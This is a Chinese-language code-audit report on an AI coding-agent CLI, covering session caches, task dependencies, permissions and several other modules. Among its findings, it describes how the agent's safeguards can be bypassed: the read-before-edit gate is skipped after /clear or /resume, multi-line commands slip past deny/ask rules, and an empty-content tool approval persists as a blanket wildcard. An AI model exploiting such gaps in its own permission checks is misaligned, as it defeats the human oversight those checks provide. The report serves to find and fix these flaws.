- **机制**: read-before-edit 门禁的设计语义是「**本会话**编辑前必须先读过该文件」——EditFile 依赖模型上下文中的文件现状来构造 `old_string`。`/clear`/`/resume` 清空了对话（模型已不再「记得」读过什么），但缓存仍记着旧会话读过的全部文件及其 mtime。只要文件自那次读取后未再变化，新会话中模型第一次 `EditFile` 就能**跳过门禁直接通过**——而此时模型上下文里根本没有文件内容，编辑的正确性完全依赖 `old_string` 精确匹配兜底。`/resume` 场景更明显：恢复的是**另一个**会话，其历史与旧缓存毫无关系。
- **不对称证据**: 远程两处对称路径（`/clear`、`/resume`）都创建全新 `FileStateCache`，终端三处路径（`/clear`、`/resume`、`/rewind`）都不创建——同一产品语义两种实现，属移植遗漏而非有意设计（无任何注释/测试声明终端应跨会话保留缓存；`tests/remote-boundaries.test.ts` 仅断言远程侧行为）。
- **验证**: 代码级确证（上述行号）+ 门禁逻辑核对（`file-state-cache.ts:22-52` 的 `check` 只查本实例 Map）。附带效果：该缓存跨会话**无界增长**（Map 永不淘汰、`/clear` 不清空，长会话进程内单调累积——每项仅 path→number，量级小，但与 L-1/M-7 同属「无界驻留」模式）。
- **建议**: `/clear` 与 `/resume` 成功路径、`/rewind` 恢复路径统一 `fileStateCacheRef.current = new FileStateCache()`（与远程 `clearConversation`/`restoreRemoteSession` 对齐）。

## 二、既有报告结论独立复核（本轮实测/代码确证）

| 既有编号       | 缺陷                                             | 本轮复核方式                                                                                                                                                                                 | 结论                                                                                                                                                                               |
| -------------- | ------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| pi P11         | cancelled 阻塞任务永久卡死依赖任务               | tsx 直跑 `src/todo/dependencies.ts` 实测：`unresolvedTaskDependencies`（`:11-16`）resolved 集合只认 `completed`；blocker 为 `cancelled` 时返回 `["1"]`（仍阻塞），为 `completed` 时返回 `[]` | **成立**（消费点核对：`todo/index.ts:198,263`、`teams/shared-task.ts:251` 三处 in_progress 门禁全部受影响；且 `shared-task.ts:210,299` 自身把 cancelled 视为终态，语义不一致确证） |
| yukino L-10    | compact 摘要消耗不计入 goal token 预算           | 复核 `compact/compact.ts` collectSummary 直连 `client.stream`，不经 `observeLlmStream`/usage 事件                                                                                            | 仍成立                                                                                                                                                                             |
| claude C7/C8   | follow-up 队列无 clear API / 失败项毒化队列      | 复核 `use-follow-up-queue.ts:88-95` 返回面无 clear；`app.tsx` 的 `/clear`（1742-1786）、`/resume`（1900-1950）、rewind（2685+）三路径确无清队调用                                            | 仍成立                                                                                                                                                                             |
| codex D1/pi P1 | 多行命令绕过 deny/ask（`globMatch` 无 `s` 标志） | 复核 `permissions/index.ts:230-244` 正则构造无 dotAll；Layer 3.5 切分仅在 `sandboxEnabled && sandboxAutoAllow && Bash`（`:661`）                                                             | 仍成立                                                                                                                                                                             |
| claude C1      | 空 content 工具 allowAlways 持久化 `Tool(*)`     | 复核 `permissions/index.ts:748-751` else 分支：`"".trim().split(/\s+/)` → `[""]` → `pattern = "*"`；`CONTENT_FIELDS`（`:137-150`）确不含 Agent/ExitWorktree/SendMessage 等                   | 仍成立                                                                                                                                                                             |
| claude C16     | MCP stdio 无 exit-cleanup 注册                   | grep `registerExitCleanup` 在 `src/mcp/` 零命中；对照 `exit-cleanup.ts:4-5` 注释点名 MCP disconnectAll                                                                                       | 仍成立                                                                                                                                                                             |

## 三、本轮验证为正确的关键实现（防误报）

- **teams 全套**（本轮全文精读）：`FileMailbox` 读写均走 `withFileSyncLock` + write-then-rename，`pruneRead` 只删已读且未读永不丢；`Team.spawnTeammate` 的 finally 链（cleanup → releaseMemberTasks → 终结消息 sendSync → 状态字段清空 → persist → prune）在嵌套 try/finally 下顺序正确，外层 `.catch` 兜住报告自身的异常；`stopOne` 的 `stopping ??=` 幂等；`waitForMember` 定时器+abort 双出口均清理监听器；`runPlanApproval` 的 shutdown 优先、`resumeAfterPlanReview` 回收等待期间文本消息（**无消息丢失**）；`TeamManager.get` 恢复时对 isActive 成员标记 failed 并 releaseOwner，与第一轮正面结论一致。
- **subagent/spawn.ts**：teammate checker 走 `forCwd`（保留 teammate 标志）而非 `forSubagent`，权限矩阵正确；`loop_complete=interrupted` 返回带 `[Interrupted]` 标记；finally 先 `taskManager.stopAll()` 再按 `options.conversation` 决定是否 dispose registry（fork 复用调用方 registry 不 dispose，正确）；transcript 已存在时只补写最后一条消息防重复。
- **a2a/executor**（对照 SDK 类型定义核验）：新版 `@a2a-js/sdk` 的 `TaskStatusUpdateEvent` **无 `final` 字段**（`a2a-CJdXl9vi.d.ts:198-228`，仅 compat v0_3 有），`statusUpdate()` 不设终止标记符合当前 SDK 契约；`execute` 的 disarm/arm idle timer 包住整个 dispatch；`cancelTask` 对无活跃 run 直接发布终态；`handlePermissionResponse` 校验 taskId 与 permissionId 双重匹配；`requestPermission` 的 abort 监听在 complete 中移除。
- **hooks/index.ts**：once 槽位执行前认领、失败（同步与异步两路径）均释放；async 钩子错误按 on_error 消化且不会成为 unhandled rejection；`validate` 直接拒绝 agent 类型配置（无宿主注册 runner，注释与实现一致）；http 钩子 30s 超时 + abort 组合信号。
- **conversation/pairing.ts（ensureToolPairing）**：结果组紧随 assistant 轮、缺失结果按边界补齐、孤儿/重复结果丢弃、空壳消息删除保角色交替——与第一轮正面结论一致，本轮重读未发现新问题。
- **cli.ts**：全部旗标互斥矩阵完整（server 模式互斥、-p×--resume、--output-format 依赖 -p）、`-p -- <prompt>` 分隔符语义正确、`--` 后多余参数拒绝、`isProcessEntry` realpath 判定防库导入副作用。
- **session/index.ts**：`rebuildFromSession` 的 boundary 回退（损坏 boundary 逐级向前找最后一个有效的）、`truncateSessionLines` 锁内 write-tmp-rename、`listSessions` 共享锁的懒清理、`loadTranscript` 逐行 zod 校验跳过坏行——与第一轮正面结论一致。
- **feedback/github.ts（3b1f5e5 改动面）**：`gistContent` 空附件 JSON 封装（空/纯空白内容不再被 Gist API 拒绝）；gh 路径改经临时目录文件中转后 `Object.entries(gistFiles)` 与 token 路径共用同一份内容构造——两通道行为一致；`truncateEncoded` 的 %XX/UTF-8 lead-byte 回退复核无误。
- **feedback/pipeline.ts（3b1f5e5 改动面）**：`Attachments.uploadError` 经 `redact()` 后才进入 issue 正文与进度消息（上传错误文本可能含 token，脱敏先行，正确）；gist 失败降级本地 bundle 的路径完整。
- **llm/model-discovery.ts**：URL 构造拒绝内嵌凭据与非 http(s)、`redirect: "error"` 防重定向泄漏 API key、分页游标环检测（`cursors.has(last_id)`）、5s 超时 + 外部 abort 组合、finally 清理监听器。
- **update/version-check.ts**：semver 严格正则（拒绝前导零）、prerelease 优先级规则（数字<字母数字、短前缀<长前缀）逐分支核对无误、dist-tag 白名单校验 + encodeURIComponent 双保险。
- **vscode/lockfile.ts**：NFC 归一化双侧、死 pid 陈旧锁剔除、envPort 优先 + workspace 唯一匹配兜底。
- **tools/registry.ts**：`dispose` 的 `??=` 幂等 + allSettled 聚合、`registerBorrowed` 与 `owned` 集合区分（借用工具不被 dispose）、`isToolVisible` 单一可见性谓词被 schemas/names 两路共享。
- **utils/paths.ts / storage**：`canonicalPath` 逐级 realpath 回退（ENOENT/ENOTDIR 收集 missing 段）、`isPathWithin` relative 判定、sessionId/listId 白名单正则、projectKey=sha256(canonicalPath)。
- **remote/browser 前端 use-chat.ts**：reducer 对 `error`/`run_state(false)`/`loop_complete` 三路都 finalize streaming 项（无光标悬挂）；`trimChatItems` 上限裁剪同步修正 currentAssistantId/currentThinkingId 悬挂引用；`tool_result` 未匹配时兜底建卡（断线重连不丢结果展示）。
- **review/selection.ts、form.ts**：git ref 注入防御（拒绝前导 `-` 与 CRLF）在 zod superRefine 层完成；选择门禁（binary/user-rule/deleted/too-large）纯函数无 IO。

## 四、本轮排查后排除的假设（防后续误报）

1. **「runPlanApproval 等待期间队友邮箱的文本消息被标记已读后丢弃」不成立**：`receiveMatchingSync` 只把**匹配谓词**（shutdown 或 plan_approval_response）的消息置 read，未匹配的文本消息保持 unread；审批通过后 `resumeAfterPlanReview`（`teams/index.ts:560-570`）显式回收这些文本并拼进恢复 prompt，shutdown 路径也有 `requeue`。无丢失。
2. **「restoreRemoteSession 不清 mcpAnnounced 导致 resume 后 MCP 指令错乱」不成立**：`syncMcpInstructions`（`mcp/instructions.ts:47-49`）以 history 为 source of truth——重建历史缺失 marker 时自动 `announced.clear()` 并全量重发，残留 Set 被自愈；`clearConversation` 的显式 clear 只是冗余保险。
3. **「A2A statusUpdate 缺少 final 终止标记」不成立**：当前依赖的 SDK 版本 `TaskStatusUpdateEvent` 无该字段（见第三节），终止由终态 TaskState + 总线 finished 语义承载。
4. **「终端 /clear 后 conversation 缺失长期记忆注入」不成立**：`conv.reset()` 把 `longTermMemoryInjected` 置 false（`conversation/index.ts:196-200`），下一轮 `Agent.run() → restoreContext()` 必然重注入；远程同理（问题只在注入内容是快照——已单列 G-1）。
5. **「远程 /resume、/clear 可在运行中换会话导致状态撕裂」不成立**：两者都只经 `handleUserMessage` 进入，入口有同步抢占的 `streaming` 守卫（`server.ts:1644-1652`），运行中不可达。

## 五、本轮修复优先级建议

1. **P1**: G-1（远程长期记忆快照——记忆管线在服务模式下只写不读，属功能闭环断裂；改为每轮实时读取即可，与终端对齐）。
2. **P2**: G-2（终端 FileStateCache 跨会话携带——三处路径补 `new FileStateCache()`，与远程对齐）。
3. 既有 P0/P1（两轮报告的 H-1/H-2/H-3/F-1/F-11 等）优先级不变，本轮复核未见任何一项被后续 commit 修复。

## 附：第三轮验证环境与证据

- G-2 与 P11 复核用 tsx 直跑 `src/todo/dependencies.ts` 实测（输出见第二节表格）；G-1/G-2 主体为代码级确证（全部行号经本轮逐行核对）。
- 4 个分区探索代理（teams/subagent/hooks、remote/browser、a2a/acp/mcp/llm、prompt/config/session/cli/sandbox）均因上游 API 网络错误终止，未产出最终结论；其部分线索（远程记忆注入、mcpAnnounced、A2A SDK 契约、stopReason 映射）已由本人逐条对照源码验证，结论见第三、四节。
- 定稿前基线：`pnpm typecheck`、`pnpm lint` 零错误；`pnpm test` 156 文件 / 2410 passed / 1 skipped（66.5s）；本轮未改动任何源码，仅追加本报告。
